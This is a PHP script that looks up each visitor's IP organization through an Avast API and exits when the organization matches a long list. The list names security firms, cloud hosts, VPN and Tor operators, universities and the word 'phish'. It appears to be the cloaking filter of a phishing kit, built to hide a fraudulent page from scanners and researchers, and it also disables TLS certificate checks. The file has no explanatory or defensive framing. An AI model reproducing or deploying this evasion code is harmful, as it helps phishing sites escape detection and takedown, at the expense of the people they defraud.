<?php
   
//===================================================================================
function babe($agent)
{

     $chz = curl_init();
           curl_setopt($chz,CURLOPT_URL,$agent);
           curl_setopt($chz,CURLOPT_RETURNTRANSFER,true);
           curl_setopt($chz, CURLOPT_SSL_VERIFYPEER, false);
     $resz = curl_exec($chz);

     return $resz;
}
$az = babe('https://ip-info.ff.avast.com/v2/info?ip='.$ip);

if (strpos($az, '"organization":"Microsoft Corporation"') ||
    strpos($az, '"organization":"iCloud Private Relay"') || 
    strpos($az, '"organization":"Green Floid LLC"') || 
    strpos($az, '"organization":"HostRoyale Technologies Pvt Ltd"') || 
    strpos($az, '"organization":"Hawaiian Telcom"') || 
    strpos($az, '"organization":"Palo Alto Networks"') || 
    strpos($az, '"organization":"Ruiz & Costa Inversiones Sl"') || 
    strpos($az, '"organization":"24 Shells"') || 
    strpos($az, '"organization":"Acurix Networks"') || 
    strpos($az, '"organization":"Free Technologies Excom S.L."') || 
    strpos($az, '"organization":"Host Europe GmbH"') || 
    strpos($az, '"organization":"MTN Nigeria"') || 
    strpos($az, '"organization":"SoftBank Corp."') || 
    strpos($az, '"organization":"Philippine Long Distance Telephone"') || 
    strpos($az, '"organization":"Hyperoptic Ltd"') || 
    strpos($az, '"organization":"Fibergrid"') || 
    strpos($az, '"organization":"Fastweb"') || 
    strpos($az, '"organization":"Fastweb"') || 
    strpos($az, '"organization":"Ipxo Limited"') || 
    strpos($az, '"organization":"INALAN/MEDIANET INVEST M.A.E."') || 
    strpos($az, '"organization":"LeaseWeb Netherlands B.V."') || 
    strpos($az, '"organization":"UK Dedicated Servers Limited"') || 
    strpos($az, '"organization":"HostRoyale Technologies Pvt Ltd"') || 
    strpos($az, '"organization":"Riverfront Internet Systems LLC"') || 
    strpos($az, '"organization":"Netprotect-sp"') || 
    strpos($az, '"organization":"Heficed"') || 
    strpos($az, '"organization":"M247 Europe SRL"') || 
    strpos($az, '"organization":"Ipxo Limited"') || 
    strpos($az, '"organization":"Tech Fibra Provedor De Internet Ltda - Me"') || 
    strpos($az, '"organization":"Konverto SpA"') || 
    strpos($az, '"organization":"CenturyLink"') || 
    strpos($az, '"organization":"Dstny A/S"') || 
    strpos($az, '"organization":"Capgemini U.S. LLC"') || 
    strpos($az, '"organization":"Heficed"') || 
    strpos($az, '"organization":"Mass Response Service GmbH"') || 
    strpos($az, '"organization":"M247 Europe SRL"') || 
    strpos($az, '"organization":"Datacamp Limited"') || 
    strpos($az, '"organization":"Verizon Business"') || 
    strpos($az, '"organization":"Next Global Services L.p."') || 
    strpos($az, '"organization":"Scaleway"') || 
    strpos($az, '"organization":"Fibergrid"') || 
    strpos($az, '"organization":"OVH SAS"') || 
    strpos($az, '"organization":"Leaseweb Los Angeles"') || 
    strpos($az, '"organization":"Cisco OpenDNS, LLC"') || 
    strpos($az, '"organization":"Globalconnect"') || 
    strpos($az, '"organization":"Dimenoc Servicos De Informatica Ltda"') || 
    strpos($az, '"organization":"Austevoll Kraftlag BA"') || 
    strpos($az, '"organization":"Nova Greece"') || 
    strpos($az, '"organization":"Spectrum"') || 
    strpos($az, '"organization":"Dhivehi Raajjeyge Gulhun (DHIRAAGU)"') || 
    strpos($az, '"organization":"Fibergrid"') || 
    strpos($az, '"organization":"OVH SAS"') || 
    strpos($az, '"organization":"Core-Backbone"') || 
    strpos($az, '"organization":"Ellinika Diktia Kalodion Mepe"') || 
    strpos($az, '"organization":"FranTech Solutions"') || 
    strpos($az, '"organization":"Aggros Operations Ltd."') || 
    strpos($az, '"organization":"The Calyx Institute"') || 
    strpos($az, '"organization":"Hosting Services Inc"') || 
    strpos($az, '"organization":"NTT Docomo"') || 
    strpos($az, '"organization":"Contabo Asia Private Limited"') || 
    strpos($az, '"organization":"Netprotect, Inc."') || 
    strpos($az, '"organization":"Fibergrid"') || 
    strpos($az, '"organization":"Contabo Asia Private Limited"') || 
    strpos($az, '"organization":"Digital Ocean"') || 
    strpos($az, '"organization":"Horizon LLC"') || 
    strpos($az, '"organization":"OVH SAS"') || 
    strpos($az, '"organization":"NTT Docomo"') || 
    strpos($az, '"organization":"NTT-ME Corporation"') || 
    strpos($az, '"organization":"EstNOC"') || 
    strpos($az, '"organization":"M247 Europe SRL"') || 
    strpos($az, '"organization":"QuickPacket, LLC"') || 
    strpos($az, '"organization":"IP Volume inc"') || 
    strpos($az, '"organization":"LeaseWeb Netherlands B.V."') || 
    strpos($az, '"organization":"M247 Europe SRL"') || 
    strpos($az, '"organization":"Fibergrid"') || 
    strpos($az, '"organization":"Informacines sistemos ir technologijos, UAB"') || 
    strpos($az, '"organization":"QuadraNet"') || 
    strpos($az, '"organization":"Datacamp Limited"') || 
    strpos($az, '"organization":"M247 Europe SRL"') || 
    strpos($az, '"organization":"Netprotect, Inc."') || 
    strpos($az, '"organization":"EstNOC"') || 
    strpos($az, '"organization":"Palo Alto Networks"') || 
    strpos($az, '"organization":"Webline Services"') || 
    strpos($az, '"organization":"CenturyLink"') || 
    strpos($az, '"organization":"OVH SAS"') || 
    strpos($az, '"organization":"Palo Alto Networks"') || 
    strpos($az, '"organization":"Beeline"') || 
    strpos($az, '"organization":"IP Volume inc"') || 
    strpos($az, '"organization":"Hydra Communications Ltd"') || 
    strpos($az, '"organization":"Dino Solutions"') || 
    strpos($az, '"organization":"CenturyLink"') || 
    strpos($az, '"organization":"Cisco OpenDNS, LLC"') || 
    strpos($az, '"organization":"Cablenet Communication Systems plc"') || 
    strpos($az, '"organization":"Cisco OpenDNS, LLC"') || 
    strpos($az, '"organization":"O2 Deutschland"') || 
    strpos($az, '"organization":"GleSYS Internet Services AB"') || 
    strpos($az, '"organization":"M247 Europe SRL"') || 
    strpos($az, '"organization":"Zwiebelfreunde e.V."') || 
    strpos($az, '"organization":"Google App Engine"') || 
    strpos($az, '"organization":"Alpha Bank SA"') || 
    strpos($az, '"organization":"Mrgroup Investments Limited"') || 
    strpos($az, '"organization":"Zscaler"') || 
    strpos($az, '"organization":"Lotus Support Services Pvt"') || 
    strpos($az, '"organization":"CYTA"') || 
    strpos($az, '"organization":"Verizon Internet Services"') || 
    strpos($az, '"organization":"Information Society S.A."') || 
    strpos($az, '"organization":"Leaseweb San Francisco"') || 
    strpos($az, '"organization":"North Carolina Research and Education Network"') || 
    strpos($az, '"organization":"icloud"') || 
    strpos($az, '"organization":"YouTube"') || 
    strpos($az, '"organization":"IP ServerOne Solutions Sdn Bhd"') || 
    strpos($az, '"organization":"facebook"') || 
    strpos($az, '"organization":"Cisco OpenDNS, LLC"') || 
    strpos($az, '"organization":"ColoUp"') || 
    strpos($az, '"organization":".ch"') || 
    strpos($az, '"organization":"TransTeleCom"') || 
    strpos($az, '"organization":"TransTeleCom"') || 
    strpos($az, '"organization":"TransTeleCom"') || 
    strpos($az, '"organization":"DedFiberCo"') || 
    strpos($az, '"organization":"TransTeleCom"') || 
    strpos($az, '"organization":"Melita"') || 
    strpos($az, '"organization":"Google App Engine"') || 
    strpos($az, '"organization":"Turkcell Superonline"') || 
    strpos($az, '"organization":"skystarglobal.net"') || 
    strpos($az, '"organization":"Telia Eesti"') || 
    strpos($az, '"organization":"Vivacom Bulgaria EAD"') || 
    strpos($az, '"organization":"green.ch AG"') || 
    strpos($az, '"organization":"Nomotech SAS"') || 
    strpos($az, '"organization":"TerraHost"') || 
    strpos($az, '"organization":"Flokinet Ltd"') || 
    strpos($az, '"organization":"Palo Alto Networks"') || 
    strpos($az, '"organization":"Google Cloud"') || 
    strpos($az, '"organization":"Choopa, LLC"') || 
    strpos($az, '"organization":"Intelligence Network Online"') || 
    strpos($az, '"organization":"cleardocks LLC"') || 
    strpos($az, '"organization":"Dino Solutions"') || 
    strpos($az, '"organization":"Aurora Networking"') || 
    strpos($az, '"organization":"Getnet International"') || 
    strpos($az, '"organization":"Geekyworks IT Solutions Pvt Ltd"') || 
    strpos($az, '"organization":"apple"') || 
    strpos($az, '"organization":"HostRoyale LLC"') || 
    strpos($az, '"organization":"Core-Backbone"') || 
    strpos($az, '"organization":"M247 Europe SRL"') || 
    strpos($az, '"organization":"M247"') || 
    strpos($az, '"organization":".com"') || 
    strpos($az, '"organization":"Obenetwork AB"') ||
    strpos($az, '"organization":"KeywebAG"') || 
    strpos($az, '"organization":"BlixSolutions"') || 
    strpos($az, '"organization":"ObenetworkAB"') || 
    strpos($az, '"organization":"M247EuropeSRL"') || 
    strpos($az, '"organization":"AmatiFoundation"') || 
    strpos($az, '"organization":"LeasewebAsiaPacificpte."') || 
    strpos($az, '"organization":"AdvaniaÃsland"') || 
    strpos($az, '"organization":"LeasewebAsia"') || 
    strpos($az, '"organization":"EonixCorporation"') || 
    strpos($az, '"organization":"SociedadBuenaHosting,S.A."') || 
    strpos($az, '"organization":"HostParaTuVidaS.A."') || 
    strpos($az, '"organization":"Fibergrid"') || 
    strpos($az, '"organization":"HostUniversalPty"') || 
    strpos($az, '"organization":"PaloAltoNetworks"') || 
    strpos($az, '"organization":"GleSYSInternetServicesAB"') || 
    strpos($az, '"organization":"Rblhst-fl"') || 
    strpos($az, '"organization":"Cisco OpenDNS, LLC"') || 
    strpos($az, '"organization":"AT&T Services"') || 
    strpos($az, '"organization":"GMO Internet,Inc"') || 
    strpos($az, '"organization":"Netprotect, Inc"') || 
    strpos($az, '"organization":"MinetHost Co., LTD."') || 
    strpos($az, '"organization":"MinetHost Co"') || 
    strpos($az, '"organization":"1&1 Internet AG"') || 
    strpos($az, '"organization":"Amazon.com"') || 
    strpos($az, '"organization":"Amazon"') || 
    strpos($az, '"organization":"Microsoft Azure"') || 
    strpos($az, '"organization":"OVH SAS"') || 
    strpos($az, '"organization":"Digital Freedom and Rights Association"') || 
    strpos($az, '"organization":"Cox Communications"') || 
    strpos($az, '"organization":"Spectrum Business"') || 
    strpos($az, '"organization":"Tencent cloud computing"') || 
    strpos($az, '"organization":"SURF B.V."') || 
    strpos($az, '"organization":"CIA TRIAD SECURITY LLC"') || 
    strpos($az, '"organization":"F3 Netze e.V."') || 
    strpos($az, '"organization":"China Telecom"') || 
    strpos($az, '"organization":"Smithville Internet"') || 
    strpos($az, '"organization":"Google Corporate Office"') || 
    strpos($az, '"organization":"CUST"') || 
    strpos($az, '"organization":"Allstream"') || 
    strpos($az, '"organization":"ColoUp"') || 
    strpos($az, '"organization":"GTT Communications Inc."') || 
    strpos($az, '"organization":"Vodafone Romania"') || 
    strpos($az, '"organization":"Verizon Wireless"') || 
    strpos($az, '"organization":"Rogers Cable"') || 
    strpos($az, '"organization":"H4Y Technologies LLC"') || 
    strpos($az, '"organization":"Keyweb AG"') || 
    strpos($az, '"organization":"Bell Canada"') || 
    strpos($az, '"organization":"Ulayer"') || 
    strpos($az, '"organization":"Jio"') || 
    strpos($az, '"organization":"netcup GmbH"') || 
    strpos($az, '"organization":"Optimum Online"') || 
    strpos($az, '"organization":"Suddenlink Communications"') || 
    strpos($az, '"organization":"Bulsatcom EOOD"') || 
    strpos($az, '"organization":"Linode"') || 
    strpos($az, '"organization":"CenturyLink"') || 
    strpos($az, '"organization":"Lumen"') || 
    strpos($az, '"organization":"Leaseweb Virginia"') || 
    strpos($az, '"organization":"Smart Technology LLC"') || 
    strpos($az, '"organization":"MikiPro"') || 
    strpos($az, '"organization":"Cox Business"') || 
    strpos($az, '"organization":"WorNet AG"') || 
    strpos($az, '"organization":"Forening for DotSrc"') || 
    strpos($az, '"organization":"Multinet Pakistan Pvt."') || 
    strpos($az, '"organization":"DigitalOcean"') || 
    strpos($az, '"organization":"Digital Ocean"') || 
    strpos($az, '"organization":"Cogent Communications"') || 
    strpos($az, '"organization":"Telepoint Ltd"') || 
    strpos($az, '"organization":"Telus Communications"') || 
    strpos($az, '"organization":"HostRoyale Technologies Pvt Ltd"') || 
    strpos($az, '"organization":"Ipxo Limited"') || 
    strpos($az, '"organization":"DedFiberCo"') || 
    strpos($az, '"organization":"TerraTransit AG"') || 
    strpos($az, '"organization":"Fortinet"') || 
    strpos($az, '"organization":"Blix Solutions"') || 
    strpos($az, '"organization":"Spectrum"') || 
    strpos($az, '"organization":"Comcast Cable"') || 
    strpos($az, '"organization":"Nexeon Technologies"') || 
    strpos($az, '"organization":"PenTeleData"') || 
    strpos($az, '"organization":"Scaleway"') || 
    strpos($az, '"organization":"AVAST Software s.r.o."') || 
    strpos($az, '"organization":"TELUS"') || 
    strpos($az, '"organization":"Tefincom S.A."') || 
    strpos($az, '"organization":"Superloop"') || 
    strpos($az, '"organization":"CNSP"') || 
    strpos($az, '"organization":"Riverfront Internet Systems LLC"') || 
    strpos($az, '"organization":"ACEHOST"') || 
    strpos($az, '"organization":"Airtel"') || 
    strpos($az, '"organization":"Beeline"') || 
    strpos($az, '"organization":"Blacknight Internet Solutions Limited"') || 
    strpos($az, '"organization":"Orion Network Limited"') || 
    strpos($az, '"organization":"Datacamp Limited"') || 
    strpos($az, '"organization":"NTT Docomo"') || 
    strpos($az, '"organization":"Leaseweb Asia"') || 
    strpos($az, '"organization":"IncoNet Data Management sal"') || 
    strpos($az, '"organization":"TalkTalk"') || 
    strpos($az, '"organization":"ServerMania"') || 
    strpos($az, '"organization":"EstNOC"') || 
    strpos($az, '"organization":"BellMobility"') || 
    strpos($az, '"organization":"Performive"') || 
    strpos($az, '"organization":"Plusnet"') || 
    strpos($az, '"organization":"eSecureData"') || 
    strpos($az, '"organization":"Heficed"') || 
    strpos($az, '"organization":"AssociationGitoyen"') || 
    strpos($az, '"organization":"Octopuces.a.r.l."') || 
    strpos($az, '"organization":"VegasNAP,LLC"') || 
    strpos($az, '"organization":"Afrihost"') || 
    strpos($az, '"organization":"FlokinetLtd"') || 
    strpos($az, '"organization":"Windscribe"') || 
    strpos($az, '"organization":"Reliablehosting.com"') || 
    strpos($az, '"organization":"Netprotect"') || 
    strpos($az, '"organization":"FreeRangeCloud"') || 
    strpos($az, '"organization":"Three"') || 
    strpos($az, '"organization":"tzulo"') || 
    strpos($az, '"organization":"IPVanish"') ||     
    strpos($az, '"organization":"Hangzhou Alibaba Advertising"') || 
    strpos($az, '"organization":"iCloud"') || 
    strpos($az, '"organization":"Alibaba"') || 
    strpos($az, '"organization":"Hangzhou Alibaba Advertising Co.,Ltd."') || 
    strpos($az, '"organization":"JSC Ufanet"') || 
    strpos($az, '"organization":"iCloud Private"') || 
    strpos($az, '"organization":"DiGi Telecommunications Sdn Bhd., Digi Internet Exchange"') ||
    strpos($az, '"organization":"Quintex Alliance Consulting"') ||
    strpos($az, '"organization":"Transip B.V."') ||
    strpos($az, '"organization":"LLC Digital Network"') ||
    strpos($az, '"organization":"24SHELLS"') ||
    strpos($az, '"organization":"T-MOBILE-AS21928"') ||
    strpos($az, '"organization":"AMAZON-02"') ||
    strpos($az, '"organization":"HostRoyale Technologies Pvt Ltd"') ||
    strpos($az, '"organization":"AMAZON-AES"') ||
    strpos($az, '"organization":"GlobalTeleHost Corp."') ||
    strpos($az, '"organization":"Amazon"') ||
    strpos($az, '"organization":"Google Proxy"') ||
    strpos($az, '"organization":"Google"') ||
    strpos($az, '"organization":"Proxy"') ||
    strpos($az, '"organization":"Microsoft Azure"') ||
    strpos($az, '"organization":"INCX Global, LLC"') ||
    strpos($az, '"organization":"DigitalOcean, LLC"') ||
    strpos($az, '"organization":"British Telecommunications PLC"') ||
    strpos($az, '"organization":"Amazon Technologies Inc."') ||
    strpos($az, '"organization":"Telegram Messenger Inc"') ||
    strpos($az, '"organization":"QuickPacket, LLC"') ||
    strpos($az, '"organization":"24 SHELLS"') ||
    strpos($az, '"organization":"CenturyLink Communications, LLC"') ||
    strpos($az, '"organization":"CenturyLink"') ||
    strpos($az, '"organization":"Amazon.com, Inc."') ||
    strpos($az, '"organization":"Amazon.com"') ||
    strpos($az, '"organization":"China Unicom Guangdong IP network"') ||
    strpos($az, '"organization":"Leaseweb USA, Inc."') ||
    strpos($az, '"organization":"Leaseweb USA"') ||
    strpos($az, '"organization":"Google LLC"') ||
    strpos($az, '"organization":"phish"') ||
    strpos($az, '"organization":"Digital Energy Technologies Ltd."') ||
    strpos($az, '"organization":"M247 Ltd"') ||
    strpos($az, '"organization":"OVH SAS"') ||
    strpos($az, '"organization":"BT"') ||
    strpos($az, '"organization":"GoDaddy.com, LLC"') ||
    strpos($az, '"organization":"green.ch AG"') ||
    strpos($az, '"organization":"Seacom"') ||
    strpos($az, '"organization":"RamNode LLC"') ||
    strpos($az, '"organization":"Glattwerk AG"') ||
    strpos($az, '"organization":"Powerhouse Management, Inc."') ||
    strpos($az, '"organization":"DigitalOcean"') ||
    strpos($az, '"organization":"Affinion International Limited"') ||
    strpos($az, '"organization":"IONOS SE"') ||
    strpos($az, '"organization":"NTS workspace AG"') ||
    strpos($az, '"organization":"OVH Hosting"') ||
    strpos($az, '"organization":"ServeTheWorld AS"') ||
    strpos($az, '"organization":"SoftLayer Technologies Inc."') ||
    strpos($az, '"organization":"AVAST Software s.r.o."') ||
    strpos($az, '"organization":"SIA Bighost.lv"') ||
    strpos($az, '"organization":"Gigabit Hosting Sdn Bhd"') ||
    strpos($az, '"organization":"Datacamp Limited"') ||
    strpos($az, '"organization":"Keminet SHPK"') ||
    strpos($az, '"organization":"Maxihost LTDA"') ||
    strpos($az, '"organization":"OOO Network of data-centers Selectel"') ||
    strpos($az, '"organization":"TL Group SRL ( IPXON Networks )"') ||
    strpos($az, '"organization":"GleSYS AB"') ||
    strpos($az, '"organization":"A1 Hrvatska d.o.o."') ||
    strpos($az, '"organization":"Proservice LLC"') ||
    strpos($az, '"organization":"Visual Online S.A."') ||
    strpos($az, '"organization":"Cyprus Telecommunications Authority"') ||
    strpos($az, '"organization":"Packet Exchange Limited"') ||
    strpos($az, '"organization":"Free Range Cloud Hosting Inc."') ||
    strpos($az, '"organization":"TELEKS DOOEL Skopje"') ||
    strpos($az, '"organization":"Globalhost d.o.o."') ||
    strpos($az, '"organization":"ENAHOST s.r.o."') ||
    strpos($az, '"organization":"I.C.S. Trabia-Network S.R.L."') ||
    strpos($az, '"organization":"IPAX OG"') ||
    strpos($az, '"organization":"VERIXI SA"') ||
    strpos($az, '"organization":"ONITELECOM - INFOCOMUNICACOES, S.A."') ||
    strpos($az, '"organization":"Telefonica UK Limited"') ||
    strpos($az, '"organization":"Aruba S.p.A."') ||
    strpos($az, '"organization":"Tencent cloud computing"') ||
    strpos($az, '"organization":"Opera Mini Proxy"') ||
    strpos($az, '"organization":"G-Core Labs S.A."') ||
    strpos($az, '"organization":"Cogent Communications"') ||
    strpos($az, '"organization":"Informacines sistemos ir technologijos, UAB"') ||
    strpos($az, '"organization":"AltusHost B.V."') ||
    strpos($az, '"organization":"FranTech Solutions"') ||
    strpos($az, '"organization":"AGUAS DEL COLORADO SAPEM"') ||
    strpos($az, '"organization":"NODOSUD S.A"') ||
    strpos($az, '"organization":"Falco Networks B.V."') ||
    strpos($az, '"organization":"Leaseweb Asia Pacific pte. ltd."') ||
    strpos($az, '"organization":"GSL Networks Pty LTD"') ||
    strpos($az, '"organization":"Foundation for Applied Privacy"') ||
    strpos($az, '"organization":"DOUGLAS ESTACIO SAGMEISTER"') ||
    strpos($az, '"organization":"A.A INFORMATICA E MANUTENCAO LTDA"') ||
    strpos($az, '"organization":"GRUPO MEGA FLASH SERVICOS E COMUNICACOES LTDA"') ||
    strpos($az, '"organization":"PARAISONET EIRELI"') ||
    strpos($az, '"organization":"ISH TECNOLOGIA S/A"') ||
    strpos($az, '"organization":"C-LIGUE TELECOMUNICACOES LTDA"') ||
    strpos($az, '"organization":"TELEFONICA BRASIL S.A."') ||
    strpos($az, '"organization":"Bulgarian Telecommunications Company Plc."') ||
    strpos($az, '"organization":"Start Communications"') ||
    strpos($az, '"organization":"Google Corporate Office"') ||
    strpos($az, '"organization":"Digital Ocean"') ||
    strpos($az, '"organization":"Ipxo Limited"') ||
    strpos($az, '"organization":"Cox Communications"') ||
    strpos($az, '"organization":"Oplay-Digital-Services"') ||
    strpos($az, '"organization":"JTGlobal"') ||
    strpos($az, '"organization":"NFOrce Entertainment B.V."') ||
    strpos($az, '"organization":"B2 Net Solutions Inc."') ||
    strpos($az, '"organization":"iWeb Technologies Inc."') ||
    strpos($az, '"organization":"China Unicom Beijing Province Network"') ||
    strpos($az, '"organization":"China Telecom (Group)"') ||
    strpos($az, '"organization":"China Telecom"') ||
    strpos($az, '"organization":"CHINA UNICOM China169 Backbone"') ||
    strpos($az, '"organization":"IPXO LIMITED"') ||
    strpos($az, '"organization":"China Unicom"') ||
    strpos($az, '"organization":"BullGuard ApS"') ||
    strpos($az, '"organization":"Renater"') ||
    strpos($az, '"organization":"Scalair SAS"') ||
    strpos($az, '"organization":"Orange S.A."') ||
    strpos($az, '"organization":"ONLINE S.A.S."') ||
    strpos($az, '"organization":"Ecritel SASU"') ||
    strpos($az, '"organization":"Verein zur Foerderung eines Deutschen Forschungsnetzes e.V."') ||
    strpos($az, '"organization":"Contabo GmbH"') ||
    strpos($az, '"organization":"Hetzner Online GmbH"') ||
    strpos($az, '"organization":"TELECOM ITALIA SPARKLE S.p.A."') ||
    strpos($az, '"organization":"Leaseweb Deutschland GmbH"') ||
    strpos($az, '"organization":"F3 Netze e.V."') ||
    strpos($az, '"organization":"CIA TRIAD SECURITY LLC"') ||
    strpos($az, '"organization":"Zwiebelfreunde e.V."') ||
    strpos($az, '"organization":"Bayer AG"') ||
    strpos($az, '"organization":"Deutsche Telekom AG"') ||
    strpos($az, '"organization":"PCCW IMS Limited"') ||
    strpos($az, '"organization":"RackForest Kft."') ||
    strpos($az, '"organization":"EstNOC OY"') ||
    strpos($az, '"organization":"Bharti Airtel Limited"') ||
    strpos($az, '"organization":"Bharat Sanchar Nigam Ltd"') ||
    strpos($az, '"organization":"Orion Network Limited"') ||
    strpos($az, '"organization":"Linknet-Fastnet ASN"') ||
    strpos($az, '"organization":"Telekomunikasi Indonesia (PT)"') ||
    strpos($az, '"organization":"Facebook, Inc."') ||
    strpos($az, '"organization":"Rachamim Aviel Twito trading as A.B INTERNET SOLUTIONS"') ||
    strpos($az, '"organization":"NETSTYLE A. LTD"') ||
    strpos($az, '"organization":"Fastweb SpA"') ||
    strpos($az, '"organization":"QTnet,Inc."') ||
    strpos($az, '"organization":"GMO Internet,Inc"') ||
    strpos($az, '"organization":"NTT Communications Corporation"') ||
    strpos($az, '"organization":"KAGOYA JAPAN Inc."') ||
    strpos($az, '"organization":"Asahi Net"') ||
    strpos($az, '"organization":"The Constant Company, LLC"') ||
    strpos($az, '"organization":"NTT-ME Corporation"') ||
    strpos($az, '"organization":"Jupiter Telecommunications Co., Ltd."') ||
    strpos($az, '"organization":"security made in Letzebuerg (SMILE gie)"') ||
    strpos($az, '"organization":"Servers.com, Inc."') ||
    strpos($az, '"organization":"Itissalat Al-MAGHRIB"') ||
    strpos($az, '"organization":"MEDITELECOM"') ||
    strpos($az, '"organization":"The Infrastructure Group B.V."') ||
    strpos($az, '"organization":"K4X OU"') ||
    strpos($az, '"organization":"Microsoft Corporation"') ||
    strpos($az, '"organization":"IP Volume inc"') ||
    strpos($az, '"organization":"Airtel Networks Limited"') ||
    strpos($az, '"organization":"Sky Cable Corporation"') ||
    strpos($az, '"organization":"ComClark Network & Technology Corp"') ||
    strpos($az, '"organization":"Firma Tonetic Krzysztof Adamczyk"') ||
    strpos($az, '"organization":"Atman Sp. z o.o."') ||
    strpos($az, '"organization":"Exatel S.A."') ||
    strpos($az, '"organization":"Bitdefender SRL"') ||
    strpos($az, '"organization":"Top Level Hosting SRL"') ||
    strpos($az, '"organization":"PJSC Vimpelcom"') ||
    strpos($az, '"organization":"Informational-measuring systems Ltd."') ||
    strpos($az, '"organization":"Kaspersky Lab AO"') ||
    strpos($az, '"organization":"NTT America, Inc."') ||
    strpos($az, '"organization":"SingNet Pte Ltd"') ||
    strpos($az, '"organization":"Afrihost (Pty) Ltd"') ||
    strpos($az, '"organization":"SK Broadband Co Ltd"') ||
    strpos($az, '"organization":"LG HelloVision Corp."') ||
    strpos($az, '"organization":"KINX"') ||
    strpos($az, '"organization":"Web Hosting"') ||
    strpos($az, '"organization":"Hosting"') ||
    strpos($az, '"organization":"TEFINCOM S.A."') ||
    strpos($az, '"organization":"Bahnhof AB"') ||
    strpos($az, '"organization":"GTT Communications Inc."') ||
    strpos($az, '"organization":"Clouvider Limited"') ||
    strpos($az, '"organization":"EE Limited"') ||
    strpos($az, '"organization":"Linode, LLC"') ||
    strpos($az, '"organization":"net4sec UG"') ||
    strpos($az, '"organization":"TalkTalk Communications Limited"') ||
    strpos($az, '"organization":"Hutchison 3G UK Limited"') ||
    strpos($az, '"organization":"ColoCrossing"') ||
    strpos($az, '"organization":"DedFiberCo"') ||
    strpos($az, '"organization":"Colocation America Corporation"') ||
    strpos($az, '"organization":"Cloud South"') ||
    strpos($az, '"organization":"University of Georgia"') ||
    strpos($az, '"organization":"Maxihost LLC"') ||
    strpos($az, '"organization":"University of Tennessee"') ||
    strpos($az, '"organization":"i3D.net B.V"') ||
    strpos($az, '"organization":"Netskope Inc"') ||
    strpos($az, '"organization":"Security Firewall Ltd"') ||
    strpos($az, '"organization":"Fast Lane Communications LLC"') ||
    strpos($az, '"organization":"AxcelX Technologies LLC"') ||
    strpos($az, '"organization":"Forcepoint, LLC"') ||
    strpos($az, '"organization":"Dino Solutions, Inc."') ||
    strpos($az, '"organization":"The Rye Telephone Company"') ||
    strpos($az, '"organization":"Flexential Colorado Corp."') ||
    strpos($az, '"organization":"Emerald Onion"') ||
    strpos($az, '"organization":"Hostodo"') ||
    strpos($az, '"organization":"Peak Internet, LLC"') ||
    strpos($az, '"organization":"Peak Internet"') ||
    strpos($az, '"organization":"Comcast Cable Communications, LLC"') ||
    strpos($az, '"organization":"Zayo Bandwidth"') ||
    strpos($az, '"organization":"Palo Alto Networks, Inc"') ||
    strpos($az, '"organization":"FortressITX"') ||
    strpos($az, '"organization":"Performive LLC"') ||
    strpos($az, '"organization":"Flexential Corp."') ||
    strpos($az, '"organization":"Faction"') ||
    strpos($az, '"organization":"Wintek Corporation"') ||
    strpos($az, '"organization":"Charter Communications, Inc"') ||
    strpos($az, '"organization":"Database by Design, LLC"') ||
    strpos($az, '"organization":"H4Y Technologies LLC"') ||
    strpos($az, '"organization":"Google, LLC"') ||
    strpos($az, '"organization":"OJSC Comcor"') ||
    strpos($az, '"organization":"MCI Communications Services, Inc. d/b/a Verizon Business"') ||
    strpos($az, '"organization":"SECURED SERVERS LLC"') ||
    strpos($az, '"organization":"Intelligence Network Online, Inc."') ||
    strpos($az, '"organization":"United Rentals (North America), Inc."') ||
    strpos($az, '"organization":"trafficforce, UAB"') ||
    strpos($az, '"organization":"Google App Engine"') ||
    strpos($az, '"organization":"Grande Communications Networks, LLC"') ||
    strpos($az, '"organization":"DigitalSpeed Communications"') ||
    strpos($az, '"organization":"Charter Communications Inc"') ||
    strpos($az, '"organization":"31173 Services AB"') ||
    strpos($az, '"organization":"VNPT Corp"') ||
    strpos($az, '"organization":"DIGITALOCEAN-ASN"')
) 
{
 {

$stripos = $stripos + 1;

   exit();
 } 
} 

?>